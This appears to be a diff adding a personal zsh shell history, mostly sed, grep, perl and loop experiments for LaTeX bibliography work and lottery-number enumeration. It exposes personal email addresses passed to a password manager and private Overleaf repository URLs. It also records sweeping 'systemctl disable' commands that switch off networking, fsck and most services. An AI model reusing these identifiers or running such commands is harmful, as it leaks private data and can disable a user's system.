@@ -1,0 +1,2375 @@
+gio
+gio trash Desktop
+grep -ri /usr/local/bin/zsh'
+grep -ri /usr/local/bin/zsh
+grep -ri bin/zsh
+whereis zsh
+cat -n exp.csv
+cat exp.csv
+man cat | grep line
+cat -n dataset.csv
+nl dataset.csv
+nl -b dataset.csv 
+nl -b a dataset.csv 
+cat -n dataset.csv 
+cat -n dataset.csv > dataset2.csv 
+sedx'
+sedx
+sedx BW BWS
+sed -Ei "s/ /,g"
+sedx \b ,
+sedx \b , dataset2.csv
+sedx \t , dataset2.csv
+sedx \n\b+ \n, dataset2.csv
+cd Genetic-Algorithm-Fuzzy-K-Modes
+sed -Ei "s/\t/,/g" dataset2.csv
+cat -n dataset2.csv > dataset3.csv
+cat -n exp.csv > dataset3.csv
+gedit tools/install-vm-compose-wine
+install-vm-compose-wine
+hdmi-same
+search time on air 0
+search toa lora 0
+search ceil 0
+grep -ri log
+grep -ri ceil
+grep -ri languageT
+grep -ri language-t
+grep -ri language
+grep -ri languaget
+grep -i languaget
+grep -i languaget *
+gedit let.vim
+python main1.py
+cat -n data1.csv > data2.csv
+bright 9 9
+bright 2 2
+redshift -b .0:.0
+redshift -b .3:.3
+search toa 0
+search gain 0
+search " gain " 0
+search lorawan 0
+bright 8 3
+bright 8 5
+bright 8 8
+bright 6 8
+qutebrowsero
+mutt
+install-skype
+skypeforlinux calcurse
+pkill zotero-bin
+pkill zotero
+skype
+sudo apt remove qutebrowser
+sudo update-alternatives --install /usr/bin/x-www-browser x-www-browser /usr/bin/chromuim 30
+sudo update-alternatives --install /usr/bin/x-www-browser x-www-browser /usr/bin/chrom 30
+skypeforlinux 
+calendar
+sudo apt install qutebrowser
+c-mutt
+gedit ~
+man gedit
+man gedit | grep dire
+man gedit | grep folder
+gedit ~/.
+gedit ~/.tmp
+c
+c q
+zsh
+qutebrowser&
+c zsh
+nautilus $!
+qutebrowser $!
+nautilus $
+nautilus
+qutebrowser &
+bash -ci "tilix -e ranger"
+man bash | grep back
+man bash | grep background
+nohub
+nohub ranger
+nohup ranger
+nohub bash -ci Aghiles/tool/shell/wm/shortcuts/ph-*/1*
+nohup bash -ci Aghiles/tool/shell/wm/shortcuts/ph-*/1*
+man tohup
+man nohup
+bash -ci Aghiles/tool/shell/wm/shortcuts/ph-*/1*
+zsh Aghiles/tool/shell/wm/shortcuts/ph-*/1*
+zsh -ci Aghiles/tool/shell/wm/shortcuts/ph-*/1*
+cd "/home/aghiles/Aghiles/tool/shell/wm/shortcuts/ph-"
+./1-administration 
+tilix -e qutebrowser
+grep -ri gnome
+touch rd
+grep -ri gnome-ter
+gnome-calculator
+gnome-todo
+gnome-todo &
+gnome-calendar
+gnome-calendar &
+sudo apt install muttprint
+sudo apt install mutt-patched
+muttprint
+false
+lpr
+grep -ri cups
+installx cups cups-client lpr
+cat myfile.txt | lpr
+rd | lpr
+cat rd | lpr
+lpinfo -m\
+
+cat rd | lpr -P /home/aghiles/Aghiles
+grep -ri aclipse
+grep -ri eclipse
+scope.sh
+#90
+80
+#
+wLq
+git clone https://git.overleaf.com/2927929339qhwfmmwdddzr test_paper\
+
+git clone https://git.overleaf.com/2927929339qhwfmmwdddzr test
+search gentic lorawan 0
+search
+search fuzzzy k-modes
+search fuzzy k-mode
+search fuzzy k-mode 0
+wlan-check
+grep -ri master
+vim
+grep -ri c-mean
+grep -ri c-means
+grep -ri means
+grep -ri "c means"
+cd a-2017/Sections/Standard/
+cd "/home/aghiles/Aghiles/tool/config/mail/mutt/accounts"
+grep -ri lder-ho
+search genetic lorawan 0
+grep -ri algorithm
+gedit $
+gedit $!
+mkdir hh
+sudo apt install newsboat
+cd hh
+nvim PFE.tex
+grep -ri airline
+grep -i airline *
+gedit init.vim 
+cd "/home/aghiles/Aghiles/tool/config/text/nvim"
+grep -i vimtex
+grep -i vimtex *
+grep -i syntax *
+grep -i revers *
+grep -i search *
+for i in {1..50}\
+echo i
+for i in {1..50}\
+echo i;
+for i in {1..50} echo $i done
+for i in {1..50} echo $i done;\
+\
+q
+for i in {1..50} echo $i\
+
+for i in {1..50} do echo $i\
+\
+\
+q
+for i in {1..50} do echo $i done\
+\
+\
+;\
+
+for i in {1..50} do; echo $i done
+for i in {1..50} do; echo $i; done
+for i in {1..50} do; echo $i done;
+for i in {1..50} do; for j in {j..50} do; for j in {j..50} echo\
+;
+for i in {1..50} do; for j in {j..50} do; for j in {j..50} echo $i;\
+\
+\
+\
+\
+\
+\
+\
+\
+
+for i in {1..50} do; for j in {j..50} do; for j in {j..50} echo $i
+for i in {1..50} do; for j in {j..50} do; for j in {j..50} do; echo $i
+C\
+for i in {1..50} do; for j in {j..50} do; for k in {j..50} do; for k in {j..50} do; for k in {j..50} dO
+for i in {1..50} do; for j in {j..50} do; for k in {j..50} do; for k in {j..50} do; for k in {j..50} do $i
+for i in {1..50} do; for j in {j..50} do; for k in {j..50} do; for k in {j..50} do; for k in {j..50} do; $i
+for i in {1..50} do; for j in {j..50} do; for k in {j..50} do; for l in {j..50} do; for m in {j..50} do; $i
+for i in {1..50} do; for j in {j..50} do; for k in {j..50} do; for l in {j..50} do; for m in {j..50} do; echo $i
+for i in {1..50} do; for j in {j..50} do; for k in {j..50} do; for l in {j..50} do; for m in {j..50} do; echo $i $j $k $l $m
+for i in {1..50} do; for j in {j..50} do; for k in {j..50} do; for l in {j..50} do; for m in {j..50} do; echo "$i $j $k $l $m"
+for i in {1..50} do; echo $i
+for i in {1..50} echo $i
+for i in {1..50}; echo $i
+for i in {1..50}; for i in {1..50};\
+\
+
+for i in {1..50}; for j in {1..50}; echo $i $j
+for i in {1..50}; for j in {1..50}; for k in {1..50}; for l in {1..50}; for m in {1..50}; echo $i $j $k $l $m
+for i in {1..50}; for j in {1..50}; for k in {1..50}; for l in {1..50}; for m in {1..50}; for n in {1..12}; for o in {1..12}; echo $i $j $k $l $m $n $o > loto
+for i in {1..50}; for j in {1..50}; if $i != $j for k in {1..50}; for l in {1..50}; for m in {1..50}; for n in {1..12}; for o in {1..12}; echo $i $j $k $l $m $n $o > loto
+for i in {1..50}; for j in {1..50}; if $i != $j; for k in {1..50}; for l in {1..50}; for m in {1..50}; for n in {1..12}; for o in {1..12}; echo $i $j $k $l $m $n $o > loto
+for i in {1..50}; for j in {1..50}; if $i != $j; do for k in {1..50}; for l in {1..50}; for m in {1..50}; for n in {1..12}; for o in {1..12}; echo $i $j $k $l $m $n $o > loto
+for x in $d; do print $x;done
+for x in {1..50}; do print $x;done
+for x in {1..50}; do print $x;echo $x; done
+for i in {1..50}; do \
+	print $i;\
+	for j in {1..50}; do \
+	if [$i -ne $j]; then\
+	print $j;\
+	for k in {1..50}; do \
+	if [$j -ne $k]; then\
+	print $k;\
+	for l in {1..50}; do \
+	if [$k -ne $l]; then\
+	print $l;\
+	for m in {1..50}; do \
+	if [$l -ne $m]; then\
+	print $m;\
+	for n in {1..12}; do \
+	print $n;\
+	for o in {1..12}; do \
+	if [$n -ne $o]; then\
+	print $o;\
+	fi\
+	done\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+done
+for i in {1..50}; do \
+	print $i;\
+	for j in {1..50}; do \
+	if [$i != $j]; then\
+	print $j;\
+	for k in {1..50}; do \
+	if [$j != $k]; then\
+	print $k;\
+	for l in {1..50}; do \
+	if [$k != $l]; then\
+	print $l;\
+	for m in {1..50}; do \
+	if [$l != $m]; then\
+	print $m;\
+	for n in {1..12}; do \
+	print $n;\
+	for o in {1..12}; do \
+	if [$n != $o]; then\
+	print $o;\
+	fi\
+	done\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+done
+if [1 != 2]; then prin b; fi
+if [1 != 2]; then print b; fi
+if 1 != 2; then print b; fi
+if [[1 != 2]]; then print b; fi
+if (1 != 2); then print b; fi
+if [ 1 != 2 ]; then print b; fi
+if ( 1 != 2 ); then print b; fi
+for i in {1..50}; do \
+	print $i;\
+	for j in {1..50}; do \
+	if [ $i != $j ]; then\
+	print $j;\
+	for k in {1..50}; do \
+	if [ $j != $k ]; then\
+	print $k;\
+	for l in {1..50}; do \
+	if [ $k != $l ]; then\
+	print $l;\
+	for m in {1..50}; do \
+	if [ $l != $m ]; then\
+	print $m;\
+	for n in {1..12}; do \
+	print $n;\
+	for o in {1..12}; do \
+	if [ $n != $o ]; then\
+	print $o;\
+	fi\
+	done\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+done
+for i in {1..50}; do \
+	for j in {1..50}; do \
+	if [ $i != $j ]; then\
+	for k in {1..50}; do \
+	if [ $j != $k ]; then\
+	for l in {1..50}; do \
+	if [ $k != $l ]; then\
+	for m in {1..50}; do \
+	if [ $l != $m ]; then\
+	for n in {1..12}; do \
+	for o in {1..12}; do \
+	if [ $n != $o ]; then\
+	print $i $j $k $l $m $n $o;\
+	fi\
+	done\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+done
+for i in {1..50}; do \
+	for j in {1..50}; do \
+	if [ $i -ne $j ]; then\
+	for k in {1..50}; do \
+	if [ $j -ne $k ]; then\
+	for l in {1..50}; do \
+	if [ $k -ne $l ]; then\
+	for m in {1..50}; do \
+	if [ $l -ne $m ]; then\
+	for n in {1..12}; do \
+	for o in {1..12}; do \
+	if [ $n -ne $o ]; then\
+	print $i $j $k $l $m $n $o;\
+	fi\
+	done\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+done
+for i in {1..50}; do \
+	for j in {1..50}; do \
+	if [ $i -ne $j ]; then\
+	for k in {1..50}; do \
+	if [ $j -ne $k ]; then\
+	for l in {1..50}; do \
+	if [ $k -ne $l ]; then\
+	for m in {1..50}; do \
+	if [ $l -ne $m ]; then\
+	for n in {1..12}; do \
+	for o in {1..12}; do \
+	if [ $n -ne $o ]; then\
+	print $i $j $k $l $m $n $o;\
+	fi\
+	;\
+	done\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+done
+for i in {1..50}; do \
+	for j in {1..50}; do \
+	if [ $i -ne $j ]; then\
+	for k in {1..50}; do \
+	if [ $j -ne $k ]; then\
+	for l in {1..50}; do \
+	if [ $k -ne $l ]; then\
+	for m in {1..50}; do \
+	if [ $l -ne $m ]; then\
+	for n in {1..12}; do \
+	for o in {1..12}; do \
+	if [ $n -ne $o ]; then\
+	print $i $j $k $l $m $n $o;\
+	fi\
+	echo ok;\
+	done\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+done
+for i in {1..50}; do \
+	for j in {1..50}; do \
+	if [ $i -ne $j ]; then\
+	for k in {1..50}; do \
+	if [ $j -ne $k ]; then\
+	for l in {1..50}; do \
+	if [ $k -ne $l ]; then\
+	for m in {1..50}; do \
+	if [ $l -ne $m ]; then\
+	for n in {1..12}; do \
+	for o in {1..12}; do \
+	if [ $n -ne $o ]; then\
+	print $i $j $k $l $m $n $o;\
+	fi\
+	done\
+	echo ok;\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+done
+for n in {1..12}; do \
+	for o in {1..12}; do \
+	if [ $n -ne $o ]; then\
+	print $i $j $k $l $m $n $o;\
+	fi\
+	done\
+	done
+for n in {1..12}; do \
+	for o in {1..12}; do \
+	if [ $n -ne $o ]; then\
+	print $n $o;\
+	fi\
+	done\
+done
+for n in {1..12}; do \
+	for o in {1..12}; do \
+	if [ $n -ne $o ]; then\
+	print $n $o;\
+	else\
+	done\
+done
+for n in {1..12}; do \
+	for o in {1..12}; do \
+	if [ $n -ne $o ]; then\
+	print $n $o;\
+	else print ok; fi\
+	done\
+done
+for n in {1..12}; do \
+	for o in {1..12}; do \
+	if [ "$n" -ne "$o" ]; then\
+	print $n $o;\
+	else print ok; fi\
+	done\
+done
+for n in {1..12}; do \
+	for o in {1..12}; do \
+	if [ "$n" -ne "$o" ]; then\
+	print $n $o;\
+	fi\
+	done\
+done
+for n in {1..12}; do \
+	for o in {1..12}; do \
+	if [ "$n" -ne "$o" ]; then\
+	print $n $o\
+	fi\
+	done\
+done
+for n in {1..12}; do \
+	for o in {1..12}; do \
+	if [[ "$n" -ne "$o" ]]; then\
+	print $n $o\
+	fi\
+	done\
+done
+for n in {1..12}; do \
+	for o in {1..12}; do \
+	if [[ "$n" -ne "$o" ]]; then\
+	print $n $o;\
+	fi\
+	done\
+done
+for i in {1..50}; do \
+	for j in {1..50}; do \
+	if [[ $i -ne $j ]]; then\
+	for k in {1..50}; do \
+	if [[ $j -ne $k ]]; then\
+	for l in {1..50}; do \
+	if [[ $k -ne $l ]]; then\
+	for m in {1..50}; do \
+	if [[ $l -ne $m ]]; then\
+	for n in {1..12}; do \
+	for o in {1..12}; do \
+	if [[ $n -ne $o ]]; then\
+	print $i $j $k $l $m $n $o;\
+	fi\
+	done\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+done
+p=0\
+for i in {1..50}; do \
+	for j in {1..50}; do \
+	if [[ $i -ne $j ]]; then\
+	for k in {1..50}; do \
+	if [[ $j -ne $k ]]; then\
+	for l in {1..50}; do \
+	if [[ $k -ne $l ]]; then\
+	for m in {1..50}; do \
+	if [[ $l -ne $m ]]; then\
+	for n in {1..12}; do \
+	for o in {1..12}; do \
+	if [[ $n -ne $o ]]; then\
+	print $p $i $j $k $l $m $n $o;\
+	p=p+1;\
+	fi\
+	done\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+done
+p=0\
+for i in {1..50}; do \
+	for j in {1..50}; do \
+	if [[ $i -ne $j ]]; then\
+	for k in {1..50}; do \
+	if [[ $j -ne $k ]]; then\
+	for l in {1..50}; do \
+	if [[ $k -ne $l ]]; then\
+	for m in {1..50}; do \
+	if [[ $l -ne $m ]]; then\
+	for n in {1..12}; do \
+	for o in {1..12}; do \
+	if [[ $n -ne $o ]]; then\
+	print $p $i $j $k $l $m $n $o;\
+	p=$p+1;\
+	fi\
+	done\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+done
+p=0\
+for i in {1..50}; do \
+	for j in {1..50}; do \
+	if [[ $i -ne $j ]]; then\
+	for k in {1..50}; do \
+	if [[ $j -ne $k ]]; then\
+	for l in {1..50}; do \
+	if [[ $k -ne $l ]]; then\
+	for m in {1..50}; do \
+	if [[ $l -ne $m ]]; then\
+	for n in {1..12}; do \
+	for o in {1..12}; do \
+	if [[ $n -ne $o ]]; then\
+	print $p $i $j $k $l $m $n $o;\
+	((p++));\
+	fi\
+	done\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+done
+p=0\
+for i in {1..50}; do \
+	for j in {1..50}; do \
+	if [[ $i -ne $j ]]; then\
+	for k in {1..50}; do \
+	if [[ $j -ne $k ]]; then\
+	for l in {1..50}; do \
+	if [[ $k -ne $l ]]; then\
+	for m in {1..50}; do \
+	if [[ $l -ne $m ]]; then\
+	for n in {1..12}; do \
+	for o in {1..12}; do \
+	if [[ $n -ne $o ]]; then\
+	print $p $i $j $k $l $m $n $o;\
+	((p++));\
+	fi\
+	done\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+	fi\
+	done\
+done > yghj.csv
+cat yghj.csv
+perl -e 'print "JAPH\n"'
+perl -d -e 1
+perl -e
+perd -d
+perl -de 0
+perl -e'while(<>){print eval,"\n"}'
+rlwrap -A -pgreen -S"perl> " perl -wnE'say eval()//$@'\
+
+alias iperl='rlwrap -A -S "perl> " perl -wnE '\''say eval()//$@'\'
+alias iperl=rlwrap -A -pgreen -S"perl> " perl -wnE'say eval()//$@'
+alias iperl='rlwrap -A -pgreen -S"perl> " perl -wnE'say eval()//$@'\
+\
+
+alias hgf=`rlwrap -A -pgreen -S"perl> " perl -wnE'say eval()//$@'`
+alias hgf='rlwrap -A -pgreen -S"perl> " perl -wnE'say eval()//$@''
+2**128
+ips
+php
+grep -ri street
+C\
+grep -ri street
+C\
+grep -ri streetmap
+C\
+grep -rin streetmap
+C\
+grep -ric streetmap
+C\
+grep -rio streetmap
+C\
+grep -rio openstreetmap
+sudo pip install black
+sudo pip3 install black
+black tic_tac_toe.py
+sed -ri 's/\n[ \t]*(#.*)(\n.*)/\2 \1/g' tic_tac_toe.py
+sed -Eri 's/\n[ \t]*(#.*)(\n.*)/\2 \1/g' tic_tac_toe.py
+sed -rzi 's/\n[ \t]*(#.*)(\n.*)/\2 \1/g' tic_tac_toe.py
+sed -Ei 's/\n[ \t]*(#.*)(\n.*)/\2 \1/g' tic_tac_toe.py
+sed -Ei 's/\n[ \t]+(#.*)(\n.*)/\2 \1/g' tic_tac_toe.py
+sed -Ei 's/\n[ \t]+(#.*)(\n.*)//g' tic_tac_toe.py
+sed -Ei 's/\n[ \t]+(#.*)//g' tic_tac_toe.py
+sed -Ei 's/\n[ \t]+(\#.*)//g' tic_tac_toe.py
+sed -Ei 's/\n[ \t]+//g' tic_tac_toe.py
+sed -Ezi 's/\n[ \t]+//g' tic_tac_toe.py
+sed -Ezi 's/\n[ \t]*(#.*)(\n.*)/\2 \1/g' tic_tac_toe.py
+sed -Ezi 's/\n[ \t]*(\#.*)//g' tic_tac_toe.py
+sed -Ezi 's/\n[ \t]*(\#.*)(\n.*)/\2 \1/g' tic_tac_toe.py
+sed -Ezi 's/\n[ \t]*(\#[^\n]*)(\n[^\n]*)/\2 \1/g' tic_tac_toe.py
+touch py-format
+grep -ri find
+grep -ri mycomman
+py-format *.py
+sed -Ezi 's/\\[ \t]*\n//g' *.py
+sed -Ezi 's/\\[ \t]*\n[ \t]*/ /g' *.py
+sed -Ezi 's/\\[ \t]*\n[ \t]*/ /g' hexapawn.py
+c-format
+grep -ri xpdf
+sedx s d sedx
+sedx d s sedx
+sedx "s(.)d" \1 sedx
+sedx "s(.)d" "\1" sedx
+sedx "s(.)d" \\1 sedx
+./recursive evince *.pdf
+./recursive cat *sedAll
+./recursive cat *.ll
+./recursive cat *ll
+./recursive cat .*ll
+./recursive cat s*ll
+./recursive less s*ll
+./recursive less sedll
+./recursive cat sedAll h g f
+./recursive cat sedAll
+./recursive cat -n sedAll
+./recursive cat -n && echo ok sedAll
+./recursive echo h && cat -n sedAll
+./recursive echo hkkk && cat -n sedAll
+search heuristic 0
+ls /etc/X11
+eclipse
+sudo systemctl stop apache2.service
+sudo systemctl disable apache2.service
+htop
+toph
+[200~https://www.digitalocean.com/community/tutorials/how-to-use-systemctl-to-manage-systemd-services-and-units
+systemctl disable asterisk.service
+systemctl disable avahi-daemon.service
+sudo systemctl list-unit-files | grep enabled | sort
+Qq
+search heiteroget 0
+search creteria 0
+man pdftk
+sudo apt install pdftk
+pdftk slide.pdf cat 22-42 output g.pdf
+evince g.pdf
+mv g.pdf fcm.pdf
+gedit ssh.sh 
+./ssh.sh 
+gedit Untitled\ Document\ 1
+mathpix
+mathpix-snipping-tool
+git clone https://git.overleaf.com/5e15f6d388f67a0001194cf2\
+
+pdftk slide cat 7-10 output fcm.pdf
+pdftk slide.pdf cat 7-10 output fcm.pdf
+man mplayer | grep conf
+man mplayer | grep .mpl
+man mplayer | grep ~/.mpl
+man mplayer | grep ~\/.mpl
+man mplayer | grep "~\/.mpl"
+man mplayer | grep "-use-filedir-conf"
+man mplayer
+man mplayer | grep -use-filedir-conf
+man mplayer | grep "sp√©cifique ne sera lu depuis"
+man mplayer | grep -C=5 "-use-filedir-conf"
+man mplayer | grep -C5 "-use-filedir-conf"
+man mplayer | grep -C15 "-use-filedir-conf"
+st
+s
+grep -ri sublim
+grep -ri subl
+nvim '+17<Enter>:match Search /\%17l/' "file:///home/aghiles/Aghiles/job/txt/05-icc/07_conclusion.tex"\
+
+nvim '+17<Enter>:match Search /\%17/' "file:///home/aghiles/Aghiles/job/txt/05-icc/07_conclusion.tex"
+nvim ':match Search /\%17/' "file:///home/aghiles/Aghiles/job/txt/05-icc/07_conclusion.tex"
+nvim '+17<Enter>:match Search \%17' "file:///home/aghiles/Aghiles/job/txt/05-icc/07_conclusion.tex"
+nvim '+353<Enter>:match Search /\%353l/' "file:///home/aghiles/Aghiles/job/txt/05-icc/04_approach.tex"
+nvim '+353<Enter>:match Search /\%353l/' "~/Aghiles/job/txt/05-icc/04_approach.tex"
+nvim '+353<Enter>:match Search /\%353l/' "/home/aghiles/Aghiles/job/txt/05-icc/04_approach.tex"
+nvim "file:///home/aghiles/Aghiles/job/txt/05-icc/04_approach.tex"
+m&n nvim | uri
+m&n nvim | url
+m&n nvim | grep uri
+m&n nvim | grep url
+man nvim | grep uri
+man nvim | grep url
+man nvim | grep path
+man nvim
+man nvim | grep file
+evince paper.pdf
+pkill nautilus
+grep -ri txte
+cat .l.txt
+cat .m
+./x-library
+cd "/home/aghiles/Aghiles/tool/shell/bibliography"
+./x-library 
+cd $WRITINGPATH/b-appendix\
+library $WRITINGPATH/resources/bib/iot.bib > .l.txt
+perl -ne 'print "$1 $2 $3\n" while /@.*{(.*),\n*|.* +title = {(.*)},\n*|.*groups = {(.*)}/g' $1 | xargs -l echo | sed -E "s/([^ ]*) (.*) ([^ ]*)$/\3 \\\cite{\1} \2 \\\newline /g" | sort | sed -E "s/\&/\\\&/g" iot.bib
+perl -ne 'print "$1 $2 $3\n" while /@.*{(.*),\n*|.* +title = {(.*)},\n*|.*groups = {(.*)}/g' $1 | xargs -l echo | sed -E "s/([^ ]*) (.*) ([^ ]*)$/\3 \\\cite{\1} \2 \\\newline /g" | sort
+perl -ne 'print "$1 $2 $3\n" while /@.*{(.*),\n*|.* +title = {(.*)},\n*|.*groups = {(.*)}/g' $1 | xargs -l echo | sed -E "s/([^ ]*) (.*) ([^ ]*)$/\3 \\\cite{\1} \2 \\\newline /g" | sort iot.bib
+perl -ne 'print "$1 $2 $3\n" while /@.*{(.*),\n*|.* +title = {(.*)},\n*|.*groups = {(.*)}/g' $1 | xargs -l echo iot.bib
+perl -ne 'print "$1 $2 $3\n" while /@.*{(.*),\n*|.* +title = {(.*)},\n*|.*groups = {(.*)}/g' iot.bib | xargs -l echo | sed -E "s/([^ ]*) (.*) ([^ ]*)$/\3 \\\cite{\1} \2 \\\newline /g"
+perl -ne 'print "$1 $2 $3\n" while /@.*{(.*),\n*|.* +title = {(.*)},\n*|.*groups = {(.*)}/g' iot.bib | xargs -l echo
+perl -ne 'print "$1 $2 $3\n" while /@.*{(.*),\n*|.* +title = {(.*)},\n*|.*groups = {(.*)}/g' iot.bib
+gedit h
+sed -Ei 's/\n / /g' h
+perl -ne 'print "$1 $2 $3\n" while /@.*{(.*),\n*|.* +title = {(.*)},\n*|.*groups = {(.*)}/g' iot.bib > h
+sed -Ezi 's/\n / /g' h
+perl -ne 'print "$1 $2 $3\n" while /@.*{(.*),\n*|.* +title = {(.*)},\n*|.*groups = {(.*)}/g' $1 | sed -E 's/\n / /g'
+perl -ne 'print "$1 $2 $3\n" while /@.*{(.*),\n*|.* +title = {(.*)},\n*|.*groups = {(.*)}/g' iot.bib | sed -E 's/\n / /g'
+perl -ne 'print "$1 $2 $3\n" while /@.*{(.*),\n*|.* +title = {(.*)},\n*|.*groups = {(.*)}/g' iot.bib | sed -Ez 's/\n / /g'
+library2 $WRITINGPATH/resources/bib/iot.bib | sed -E "s/^(.*)/sed \-ie \'s\/\\1\/ytre\/g\' .l.txt
+library2 $WRITINGPATH/resources/bib/iot.bib | sed -E "s/^(.*)/sed \-ie \'s\/\\1\/ytre\/g\'
+library2 $WRITINGPATH/resources/bib/iot.bib | sed -E "s/^(.*)/sed \-ie \'s\/\\1\/ytre\/g\' .l.txt; sed \-ie \'0,\/ytre\/\{s\/ytre\/\\1\\/\}\' .l.txt; sed \-ie \'s\/ytre\/\/g\' .l.txt/g"
+library2 $WRITINGPATH/resources/bib/iot.bib | sed -E "s/^(.*)/sed \-ie \'s\/\\1\/ytre\/g\' .l.txt; sed \-ie \'0,\/ytre\/\{s\/ytre\/\\1\\/\}\' .l.txt; sed \-ie \'s\/ytre\/\/g\' .l.txt/g" > .m
+./m
+./.m
+library2 $WRITINGPATH/resources/bib/iot.bib
+library2 $WRITINGPATH/resources/bib/iot.bib | sort
+man sort
+library2 $WRITINGPATH/resources/bib/iot.bib | sort -r
+sed -ie 's/lora-z/ytre/g' .l.txt
+sed -ie 's/5g/ytre/g' .l.txt
+sed -ie '0,/ytre/{s/ytre/5g/}' .l.txt
+cd $WRITINGPATH/b-appendix
+library $WRITINGPATH/resources/bib/iot.bib > .l.txt
+w
+x-liba
+cd "/home/aghiles/Aghiles/tool/config/text/latex"
+grep -ri draft
+ranger $READINGPATH
+cod
+grep -ri aaaaaaaa
+grep -ri aaaaaa
+grep -r aaaaaa
+grep -ri tfrdesbvcxoikhhffq
+grep -r tfrdesbvcxoikhhffq
+sqlite zotero1.sqlite
+sqlite3 zotero1.sqlite
+gnome-disks
+perl -ne 'print "$3\n" while /@.*{(.*),\n*|.* +annotation = {([^}]+[^,]+[^\n]+)},\n *|.*groups = {(.*)}/g' $WRITINGPATH/resources/bib/iot.bib
+sed -Ei 's/\n([^@ ])/\1/g' $WRITINGPATH/resources/bib/iot.bib
+sed -Ei 's/\\_/\_/g' $WRITINGPATH/resources/bib/iot.bib
+sed -Ei 's/\\{/\{/g' $WRITINGPATH/resources/bib/iot.bib
+sed -Ei 's/\\{/{/g' $WRITINGPATH/resources/bib/iot.bib
+sed -Ei 's/\\\{/\{/g' $WRITINGPATH/resources/bib/iot.bib
+sed -Ei 's/\\textbackslash{}/\\/g' $WRITINGPATH/resources/bib/iot.bib
+sed -Ei 's/\\textbackslash\{\}/\\/g' $WRITINGPATH/resources/bib/iot.bib
+sed -Ei 's/\\\}/\}/g' $WRITINGPATH/resources/bib/iot.bib
+x-library 
+x-library
+sed -Ei 's/\\\\\n/ /g' $WRITINGPATH/resources/bib/iot.bib
+sed -Ei 's/\\\\\\\n/ /g' $WRITINGPATH/resources/bib/iot.bib
+sed -Ezi 's/\\\\\n/ /g' $WRITINGPATH/resources/bib/iot.bib
+grep -ri clip
+sudo apt remove gedit
+sudo apt remove gedit-*
+sudo apt install gedit
+sudo apt install gedit-*
+cd $TOOLSPATH/bibliography/storage
+search wireless 10
+subl
+gnome-control-center 
+doc
+mu\
+
+cd macros
+sudo systemctl desable
+sudo systemctl desable apache
+sudo systemctl -h
+sudo systemctl -desable apache
+sudo systemctl disable cups
+sudo systemctl disable apache
+sudo systemctl list
+sudo systemctl show
+sudo systemctl show list
+sudo systemctl disable snapd
+sudo systemctl disable snap
+sudo systemctl disable snap*
+sudo systemctl disable sshd
+sudo systemctl disable mariadb
+sudo systemctl disable snap-core-8268.mount snap-mathpix\x2dsnipping\x2dtool-78.mount accounts-daemon.service anacron.service apparmor.service autovt@.service binfmt-support.service blk-availability.service bluetooth.service clamav-daemon.service clamav-freshclam.service console-setup.service cron.service cups-browsed.service dbus-fi.w1.wpa_supplicant1.service dbus-org.bluez.service dbus-org.freedesktop.ModemManager1.service dbus-org.freedesktop.nm-dispatcher.service dbus-org.freedesktop.timesync1.service getty@.service ipsec.service iscsi.service iscsid.service keyboard-setup.service lvm2-monitor.service mailman3.service ModemManager.service mosquitto.service mpd.service network-manager.service networking.service NetworkManager-dispatcher.service NetworkManager-wait-online.service NetworkManager.service nfs-kernel-server.service nfs-server.service nginx.service nvidia-persistenced.service open-iscsi.service osspd.service portmap.service postgresql.service pppd-dns.service rbdmap.service rpcbind.service rsync.service rsyslog.service schroot.service snapd.seeded.service sssd.service strongswan.service switcheroo-control.service syslog.service sysstat.service systemd-fsck-root.service systemd-timesyncd.service udisks2.service unattended-upgrades.service vboxautostart-service.service vboxballoonctrl-service.service vboxdrv.service vboxweb-service.service wpa_supplicant.service dm-event.socket gpsd.socket lvm2-lvmpolld.socket mpd.socket pcscd.socket rpcbind.socket snapd.socket sssd-secrets.socket uuidd.socket ceph.target nfs-client.target remote-fs.target anacron.timer apt-daily-upgrade.timer apt-daily.timer certbot.timer logrotate.timer man-db.timer
+sudo systemctl disable snap-mathpix\x2dsnipping\x2dtool-78.mount
+sudo systemctl disable snap-mathpix
+sudo systemctl disable snap-mathpix*
+sudo systemctl disable "snap-mathpix dsnipping dtool-78.mount"
+sudo systemctl disable systemd-fsck-root.service
+systemctl list-unit-files
+systemctl list-unit-files | grep static
+sudo systemctl disable *
+sudo systemctl disable all
+sudo systemctl disable .*
+sudo systemctl disable apache2
+sudo apt-get install jobs-admin
+jobs-admin
+sudo apt-get install sysv-rc-conf
+sysv-rc-conf
+cat /etc/init/service.override
+cat /etc/init
+ls /etc/init
+sudo ls /etc/init
+sudo ls /etc/
+nautilus ls /etc/
+pass edit adjoudi@inseec-edu.com
+pass adjoudi@inseec-edu.com
+pass djaghiles@gmail.com
+sudo sysv-rc-conf
+systemctl list-unit-files | grep enabled
+sudo systemctl enable networking
+sudo systemctl enable network.manager
+sudo systemctl enable network-manager
+systemctl list-unit-files | grep disabled | network
+sudo systemctl enable systemd-networkd
+sudo systemctl enable wpa_supplicant
+sudo systemctl enable wpa_supplicant-nl80211@
+sudo systemctl enable systemd-modules-load
+systemctl list-unit-files | grep disabled
+sudo systemctl enable systemd-.*
+sudo systemctl enable systemd-*
+sudo systemctl enable accounts-daemon
+sudo systemctl enable wpa_supplicant@
+sudo systemctl enable wpa_supplicant-wired@
+systemctl list-unit-files | grep disabled | grep wpa
+systemctl list-unit-files | grep disabled | grep network
+inst
+grep -ri mende
+gedit ide/x-install-mendeley
+x-install-mendeley
+mendeley-desktop
